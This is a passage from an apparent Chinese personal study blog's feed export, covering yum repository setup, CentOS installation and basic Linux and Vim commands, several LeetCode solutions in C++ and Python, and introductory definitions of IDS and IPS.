等等</p><h3 id="四、源码包与RPM包的不同"><a href="#四、源码包与RPM包的不同" class="headerlink" title="四、源码包与RPM包的不同"></a>四、源码包与RPM包的不同</h3><p><strong>源码包</strong>：由厂商开源发布，安装时可定制安装路径，整个软件所有产生的文件都集中在一个文件夹里，方便删除和移动。</p><p><strong>RPM包</strong>：由厂商封装好，操作系统提供RPM包管理支持，安装路径固定，且分散（比如配置文件在/etc，可执行文件在/bin），不可以详细的定制安装路径，但是方便管理，只需要使用rpm命令工具即可进行管理操作，无需手动管理。</p><h3 id="五、Yum源安装软件"><a href="#五、Yum源安装软件" class="headerlink" title="五、Yum源安装软件"></a>五、Yum源安装软件</h3><p>Yum源工具本身就是为了使安装与卸载等操作简单化，原理上是根据配置文件中的依赖关系列表来自动化处理依赖关系。</p><h4 id="1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖"><a href="#1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖" class="headerlink" title="1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖"></a>1、自己写一个yum配置文件，可以使用yum自动的安装光盘中的RPM包并处理相关依赖</h4><p><strong>yum配置文件路径</strong>：/etc/yum.repo.d</p><p>1）首先将yum.repo.d下的所有配置文件备份到一个bak文件夹中</p><p>2）新建一个文件dvd.repo，并且编辑它</p><p>3）内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[dvdrom] #标签</span><br><span class="line">name=&quot;yum dvd rom&quot; #描述</span><br><span class="line">baseurl=file:///media/CentOS_6.9_Final #依赖关系列表位置</span><br><span class="line">gpgcheck=0 #是否进行密钥对检查，如需检查，下一行需要写公钥文件位置gpgkey=file:///XXXX（由于公钥是权威的Centos的公钥，而私钥无人知道，因此很保密、权威）</span><br></pre></td></tr></table></figure><p>依赖关系列表就存储在光盘中的repodata中，以xml的形式存在。 这些xml应该不仅描述了软件的依赖，还描述了软件的安装地址。（否则如何在不联网的情况下自动安装了DVD1中的rpm）</p><p><strong>yum安装软件</strong>：<code>yum install 软件名</code></p><p><strong>yum卸载软件</strong>：<code>yum remove 软件名</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>31-下一个排列</title>
      <link href="/2020/07/17/Leetcode/31%E3%80%81%E4%B8%8B%E4%B8%80%E4%B8%AA%E6%8E%92%E5%88%97/"/>
      <url>/2020/07/17/Leetcode/31%E3%80%81%E4%B8%8B%E4%B8%80%E4%B8%AA%E6%8E%92%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="31、下一个排列"><a href="#31、下一个排列" class="headerlink" title="31、下一个排列"></a>31、下一个排列</h2><p><a href="https://leetcode-cn.com/problems/next-permutation/">https://leetcode-cn.com/problems/next-permutation/</a></p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://imgchr.com/i/U652nI"><img src="https://s1.ax1x.com/2020/07/17/U652nI.png" alt="U652nI.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题乍一看非常的难理解，通过评论区翻译后得知，题目输入提供了一个数组，每个数组元素都是一个0-9的数字，这一个数组组成的数字序列可以一个数值。题目的要求就是调整数字序列来让这个数值是<strong>下一个</strong>更大的数值；如果这个数字序列是降序排序的，很明显已经是最大的数值了，就要求把序列改成最小的序列（很明显就是reverse即可）</p><p>由数字全降序为最大数值我们可知，一旦这个数字序列不是降序，必然有下一个序列组成更大的数值。那么就可以用指针A从右向左遍历直到遍历到非降序的事件发生，也就是nums[A] &lt; nums[A+1]。此时，再从A右侧的数字序列中选择一个“nums[A]下一个更大的数值”与nums[A]进行swap，然后对右侧的降序序列reverse为升序即可。</p><p><a href="https://imgchr.com/i/U65Gp4"><img src="https://s1.ax1x.com/2020/07/17/U65Gp4.png" alt="U65Gp4.png"></a></p><blockquote><p>全降序直接reverse；非全降序找到右向左遍历的”升序值”与右侧较大于“升序值”的数swap后再reverse”升序值”右部分序列即是”更大的数值”。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = n<span class="number">-2</span>; i &gt;= <span class="number">0</span>; i-- ) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i+<span class="number">1</span>] &gt; nums[i]) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> j;</span><br><span class="line">            <span class="keyword">for</span> (j = n<span class="number">-1</span>; j &gt;= i+<span class="number">1</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[i]) &#123;</span><br><span class="line">                    swap(nums[j], nums[i]);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> l = i+<span class="number">1</span>, r = n<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                swap(nums[l], nums[r]);</span><br><span class="line">                l++;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">           </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> l = <span class="number">0</span>, r = n<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                swap(nums[l], nums[r]);</span><br><span class="line">                l++;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、部署Centos以及Linux基本命令与知识</title>
      <link href="/2020/07/17/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2Centos%E4%BB%A5%E5%8F%8ALinux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%B8%8E%E7%9F%A5%E8%AF%86-1/"/>
      <url>/2020/07/17/%E9%98%B6%E6%AE%B5%E4%BA%8C%E3%80%81Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/1%E3%80%81%E9%83%A8%E7%BD%B2Centos%E4%BB%A5%E5%8F%8ALinux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%B8%8E%E7%9F%A5%E8%AF%86-1/</url>
      
        <content type="html"><![CDATA[<h2 id="部署Centos"><a href="#部署Centos" class="headerlink" title="部署Centos"></a>部署Centos</h2><h3 id="一、部署Centos6-9系统"><a href="#一、部署Centos6-9系统" class="headerlink" title="一、部署Centos6.9系统"></a>一、部署Centos6.9系统</h3><blockquote><p>部署Centos6.9系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、安装且升级一个已存在的操作系统</span><br><span class="line"></span><br><span class="line">2、用基本图形驱动安装系统</span><br><span class="line"></span><br><span class="line">3、安装救援系统</span><br><span class="line"></span><br><span class="line">4、从本地驱动启动</span><br><span class="line"></span><br><span class="line">5、内存检测</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳过光盘检查</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">取消UTC时间</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选择适用所有空件，并选中查看并修改系统分区</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">选择现在自定义，自定义安装系统服务软件</span><br><span class="line">桌面 -&gt; 除了kde桌面其余全部打钩，并且将开发里面的所有选项打钩</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kdump用不用都可</span><br></pre></td></tr></table></figure></blockquote><h3 id="二、系统初始操作"><a href="#二、系统初始操作" class="headerlink" title="二、系统初始操作"></a>二、系统初始操作</h3><p>1、关闭防火墙：<code>setup</code>图形化操作界面。查看防火墙的规则状态：<code>iptables -nL</code></p><p>2、关闭SElinux：/etc/selinux/config 配置文件中的SELINUX=disabled</p><h3 id="三、查看系统基本状态"><a href="#三、查看系统基本状态" class="headerlink" title="三、查看系统基本状态"></a>三、查看系统基本状态</h3><p><strong>查看硬盘大小</strong>：<code>fdisk -l</code></p><p><strong>硬盘相关知识：</strong>Linux中挂载的SATA硬盘是SD开头，/dev/sda表示第一块硬盘、/dev/sdb表示第二块以此类推(Linux2.X以后所有硬盘都是sd开头了（以前还有HDA IDE接口的第一块硬盘）?) /dev/sda1就表示第一块硬盘的第一个分区，以此类推。</p><p><strong>查看内存信息</strong>：<code>cat /proc/meminfo</code></p><p><strong>查看cpu信息</strong> :<code>cat /proc/cpuinfo</code></p><h3 id="四、Linux根目录结构"><a href="#四、Linux根目录结构" class="headerlink" title="四、Linux根目录结构"></a>四、Linux根目录结构</h3><p>Linux系统文件组织形式采用FHS文件系统层次化标准</p><blockquote><p>鸟哥的Linux私房菜(顶顶的)：<a href="http://linux.vbird.org/linux_basic/0210filepermission.php#dir">http://linux.vbird.org/linux_basic/0210filepermission.php#dir</a></p></blockquote><p><a href="https://imgchr.com/i/UsUbZV"><img src="https://s1.ax1x.com/2020/07/17/UsUbZV.png" alt="UsUbZV.png"></a></p><p>除FHS标准以外，Linux增设的目录。</p><p><a href="https://imgchr.com/i/UsN9p9"><img src="https://s1.ax1x.com/2020/07/17/UsN9p9.png" alt="UsN9p9.png"></a></p><p>重点在于：/proc 和 /sys 其实是虚拟文件系统，不占用硬盘空间，只占用内存空间。另外/usr不是”user”而是unix software resource。</p><h3 id="五、基本的Linux命令与快捷键"><a href="#五、基本的Linux命令与快捷键" class="headerlink" title="五、基本的Linux命令与快捷键"></a>五、基本的Linux命令与快捷键</h3><p><code>ls -a</code> List files显示所有文件（包括隐藏文件）</p><p><code>Ctrl+l</code>清屏、<code>Ctrl+c</code>打断目前命令</p><p><code>help</code>，除man手册以外Linux自带的帮助命令。</p><p><code>du</code>查看文件所占磁盘大小，以块大小为单位！默认1个块block是4KB，也就是4096字节。</p><p><strong>复制与转换一个文件</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if&#x3D;输入文件 of&#x3D;输出文件 bs&#x3D;单位 count&#x3D;多少个单位</span><br></pre></td></tr></table></figure><p><strong>压缩文件</strong>：<code>gzip 文件名， bzip2 文件名</code>（不保留源文件），<code>gzip/bzip -c 文件名 &gt; *.gz/bz2</code>，（保留原文件，-c是将压缩结果输出）</p><p><strong>解压文件</strong>：<code>gunzip 压缩包/gzip -d 压缩包；bunzip2 压缩包/bzip2 -d 压缩包</code> (不保留原文件)，``gzip/bzip -dc 压缩包 &gt; 新文件名`（保留原文件）</p><p><strong>查看压缩文件</strong>：<code>zcat/bzcat *.gz/*.bz2</code></p><p><strong>查看系统开启的端口状态：</strong><code>ss -an</code></p><p><strong>查看系统进程占用的端口状态：</strong><code>netstat -t(TCP)nlp（进程号与程序名称）</code></p><p><strong>tar工具对目录进行打包和压缩</strong>：</p><blockquote><p><strong>tar [主选项+辅选项] [文件1] [文件2] [目录1] [目录2] [……]</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主选项：（每次只能使用一个）</span><br><span class="line">c 创建一个新归档文件（小c）</span><br><span class="line">x 从归档文件中提取文件出来 #主选项x会自动识别归档文件压缩的格式，并进行解压</span><br><span class="line">t 列出归档文件的内容</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">辅选项：（每次可以使用多个）</span><br><span class="line">z 通过gzip的支持进行压缩&#x2F;解压，一般格式为*.tar.gz</span><br><span class="line">j 通过bzip2的支持进行压缩&#x2F;解压，一般格式为*.tar.bz2</span><br><span class="line">v 归档或解包过程中显示被打包的文件</span><br><span class="line">C 只在解压时，若要在特定目录解压,使用它（大C）</span><br><span class="line">P 对绝对路径的文件或目录进行操作(默认tar用相对路径)</span><br><span class="line">f 输出结果到文件，必须选该项</span><br></pre></td></tr></table></figure></blockquote><h3 id="六、Linux文件的类型"><a href="#六、Linux文件的类型" class="headerlink" title="六、Linux文件的类型"></a>六、Linux文件的类型</h3><p>1、 <strong>-</strong> ：常规文件regular file， 纯文字文件，二进制文件，数据格式文件。</p><p>2、<strong>d</strong>：目录directory。</p><p>3、<strong>l</strong>：链接文件link。硬链接，inode相同，都指向硬盘里同一个存储数据。软连接，inode不同，指向的是另外一个inode。</p><p>4、<strong>b</strong>:块设备文件block，这种设备可以随意在不同的区域读写，如硬盘、软盘等，如/dev/sda。</p><p>5、<strong>c</strong>：字符设备文件character，字符设备文件必须一次性读取数据，如键盘、鼠标等。</p><p>6、<strong>s</strong>：数据接口文件sockets，通常用于网络传输，例如/dev/tcp/XXXX</p><p>7、<strong>p</strong>：管道文件FIFO。</p><h3 id="七、Vim快捷命令"><a href="#七、Vim快捷命令" class="headerlink" title="七、Vim快捷命令"></a>七、Vim快捷命令</h3><p>删除行：<code>数字+dd</code>删除光标以及下面的n行，默认是1行</p><p>复制当前行：<code>yy</code></p><p>复制到光标上一行：<code>P</code></p><p>移到文件首：<code>gg</code>，移到文件末：<code>G</code>，移动到第n行：<code>nG</code></p><p>移动到行首：<code>数字0/Home键/^</code>，移动到行尾：<code>End/$</code></p><p>匹配上一个匹配字：<code>N</code></p><p>命令模式下<code>ZZ</code>相当于<code>wq</code>无需输入<code>:</code>即可保存退出</p><p>替换字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#96;s&#x2F;被替代&#x2F;替代的字符串&#96; （只替换光标当前行的第一个匹配的字符串）</span><br><span class="line">&#96;s&#x2F;被替代&#x2F;替代的字符串&#x2F;g&#96; （只替换光标当前行所有匹配的字符串）</span><br><span class="line">&#96;n1,n2 s&#x2F;被替代&#x2F;替代的字符串&#x2F;g&#96; （替换n1到n2行所有匹配的字符串）</span><br><span class="line">&#96;% s&#x2F;被替代&#x2F;替代的字符串&#x2F;g&#96; （替换当前页所有匹配的字符串）</span><br></pre></td></tr></table></figure><p>另存为当前文件（备份）:<code>w /路径/文件名（可绝对可相对）</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux系统安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux系统安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>15-三数之和/18-四数之和</title>
      <link href="/2020/07/16/Leetcode/15%E3%80%81%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C&amp;18%E3%80%81%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2020/07/16/Leetcode/15%E3%80%81%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C&amp;18%E3%80%81%E5%9B%9B%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="15、三数之和-18、四数之和"><a href="#15、三数之和-18、四数之和" class="headerlink" title="15、三数之和/18、四数之和"></a>15、三数之和/18、四数之和</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://leetcode-cn.com/problems/3sum/">https://leetcode-cn.com/problems/3sum/</a></p><p><a href="https://imgchr.com/i/Uri4k4"><img src="https://s1.ax1x.com/2020/07/16/Uri4k4.png" alt="Uri4k4.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>​    本题看懂题目后，第一反应就是三层循环遍历得出三元组的解。但必然会超时，并且还有一些小坑。比如，要求得出的三元组满足a+b+c=0且不能重复。如果是三层循环得出解后，再进行去重，相当于在O(N3)的时间复杂度上雪上加霜。</p><p>​    首先考虑如何去重，就是将nums数组从小到大排序，然后每一层循环都判断一次当前nums[i]值是否等于上一次循环的值nums[i-1]，如果是直接跳过此次循环即可，但仅仅这样时间复杂度没有降下去。只能通过简化循环来降低时间复杂度。</p><p>​    降低时间复杂度的方法：由于数组是从小到大排序，在不断的循环过程中每一层循环的数值都在增大，且条件要求是a+b+c=0，a+b越大，c就得越小才能满足条件，就可以使用类似双指针的方法，来将第二层和第三层循环简化为一层循环。在确定第一层循环a的值后，把b和c作为双指针来进行移动，b正常按照循环判断，c的指针则用while循环左移直到满足a+b+c&lt;=0的条件。</p><p>​    这样，第二层和第三层只需要走一趟就可以结束，成功将O(N3)简化到O(N2)。排序的时间复杂度是O(NlogN)，在渐进意义下小于前者，因此算法的总时间复杂度为 O(N^2)<em>O</em>(<em>N</em>2)。</p><blockquote><p>总结：排序判断去重，找规律双指针降低时间复杂度。18、四数之和只需再加一层循环即可。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">threeSum</span>(<span class="params">self, nums: List[int]</span>) -&gt; List[List[int]]:</span></span><br><span class="line">        result = list()</span><br><span class="line">        n = len(nums)</span><br><span class="line">        nums.sort();</span><br><span class="line">        <span class="keyword">for</span> first <span class="keyword">in</span> range(n<span class="number">-2</span>):</span><br><span class="line">            <span class="keyword">if</span> first != <span class="number">0</span> <span class="keyword">and</span> nums[first] == nums[first<span class="number">-1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            third = n - <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> second <span class="keyword">in</span> range(first + <span class="number">1</span>,third):</span><br><span class="line">                <span class="keyword">if</span> second != first + <span class="number">1</span> <span class="keyword">and</span> nums[second] == nums[second<span class="number">-1</span>]:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">while</span> nums[first] + nums[second] + nums[third] &gt; <span class="number">0</span> <span class="keyword">and</span> third &gt; second:</span><br><span class="line">                    third-=<span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> third == second:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> nums[first] + nums[second] + nums[third] == <span class="number">0</span>:</span><br><span class="line">                    result.append([nums[first],nums[second],nums[third]])</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>785-判断二分图</title>
      <link href="/2020/07/16/Leetcode/785%E3%80%81%E5%88%A4%E6%96%AD%E4%BA%8C%E5%88%86%E5%9B%BE/"/>
      <url>/2020/07/16/Leetcode/785%E3%80%81%E5%88%A4%E6%96%AD%E4%BA%8C%E5%88%86%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="785、判断二分图"><a href="#785、判断二分图" class="headerlink" title="785、判断二分图"></a>785、判断二分图</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><p><a href="https://leetcode-cn.com/problems/is-graph-bipartite/">https://leetcode-cn.com/problems/is-graph-bipartite/</a></p><p><a href="https://imgchr.com/i/UDBX34"><img src="https://s1.ax1x.com/2020/07/16/UDBX34.png" alt="UDBX34.png"></a></p><h3 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h3><p>此题重点在于分析题目，到底如何才算一个二分图。根据题目分析，一个图的所有节点分成两个集合A和B，且途中每一条边的两个节点必须一个来自A一个来自B。说白了，<u>就是图中任意两条边必须要属于不同的集合</u>。在code中节点属于不同的集合使用颜色来表示。那么就可以遍历图中所有的节点，并将其着色A，然后再将该节点所有相邻的节点进行着色B，在遍历的过程中一旦发现相邻节点已着色并且着色是A（相邻颜色相同），那么就说明不满足二分图的条件。直接结束遍历，返回false。</p><p>题目提供了邻接表，邻接表每一行的元素恰好代表着”行号点”所有相邻的点。因此，利用邻接表即可进行遍历，本题使用的是深度遍历方法。</p><blockquote><p><strong>注意：</strong>由于题目没有说图是连通图，所以非连通图一次是遍历不完的，因此需要对每一个节点都执行一次遍历。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> <span class="keyword">const</span> RED = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> <span class="keyword">const</span> GREEN = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">constexpr</span> <span class="keyword">int</span> UNCOLORED = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">bool</span> result; </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; color;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> flag, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; graph)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//着色</span></span><br><span class="line">        color[n] = flag;</span><br><span class="line">        <span class="keyword">int</span> unflag = (flag == RED ? GREEN : RED);<span class="comment">//得到相反的颜色</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> go : graph[n]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(color[go] == UNCOLORED) &#123;</span><br><span class="line">                bfs(go, unflag, graph);</span><br><span class="line">                <span class="keyword">if</span>(!result) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (color[go] != unflag) &#123;</span><br><span class="line">                result = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isBipartite</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; graph)</span> </span>&#123;</span><br><span class="line">        color.assign(graph.<span class="built_in">size</span>(), UNCOLORED);</span><br><span class="line">        result = <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//每一个点都遍历着色，以处理非连通图的情况</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; (i &lt; graph.<span class="built_in">size</span>()) &amp;&amp; result; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(color[i] == UNCOLORED) &#123;</span><br><span class="line">                bfs(i, RED, graph);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode题解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDS/IPS</title>
      <link href="/2020/07/16/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/29%E3%80%81IDSIPS/"/>
      <url>/2020/07/16/%E9%98%B6%E6%AE%B5%E4%B8%80%E3%80%81%E6%95%B0%E9%80%9A%E5%AE%89%E5%85%A8/29%E3%80%81IDSIPS/</url>
      
        <content type="html"><![CDATA[<h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS/IPS"></a>IDS/IPS</h2><h3 id="一、IDS"><a href="#一、IDS" class="headerlink" title="一、IDS"></a>一、IDS</h3><h4 id="1、IDS"><a href="#1、IDS" class="headerlink" title="1、IDS"></a>1、IDS</h4><p>Intrusion Detection Systems == 入侵检测系统</p><p><strong>定义</strong>：专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，并记录及报警，以保证网络系统资源的机密性、完整性和可用性 ，但不能实时的对入侵进行阻断。</p><h4 id="2、IPS"><a href="#2、IPS" class="headerlink" title="2、IPS"></a>2、IPS</h4><p>Intrusion Prevention Systems == 入侵防御系统</p><p><strong>定义</strong>：IPS系统检测流经的数据流量，阻断攻击，对攻击采取防御措施。防御措施包括：向管理中心告警；丢弃该报文；丢弃该会话；切断会话连接</p><h3 id="二、IDS-IPS与防火墙的关系"><a href="#二、IDS-IPS与防火墙的关系" class="headerlink" title="二、IDS/IPS与防火墙的关系"></a>二、IDS/IPS与防火墙的关系</h3><p><a href="https://imgchr.com/i/UB6iu9"><img src="https://s1.ax1x.com/2020/07/16/UB6iu9.png" alt="UB6iu9.png"></a></p><p>防火墙：关心的是区域隔离，要说防火墙有检测入侵行为的能力，那也仅限于DDOS攻击之类！</p><p>IPS：关心的是数据本身是否又入侵行为！</p><h3 id="三、IDS与IPS的区别"><a href="#三、IDS与IPS的区别" class="headerlink" title="三、IDS与IPS的区别"></a>三、IDS与IPS的区别</h3><p><a href="https://imgchr.com/i/UBclzF"><img src="https://s1.ax1x.com/2020/07/16/UBclzF.png" alt="UBclzF.png"></a></p><h3 id="四、IDS与IPS的部署"><a href="#四、IDS与IPS的部署" class="headerlink" 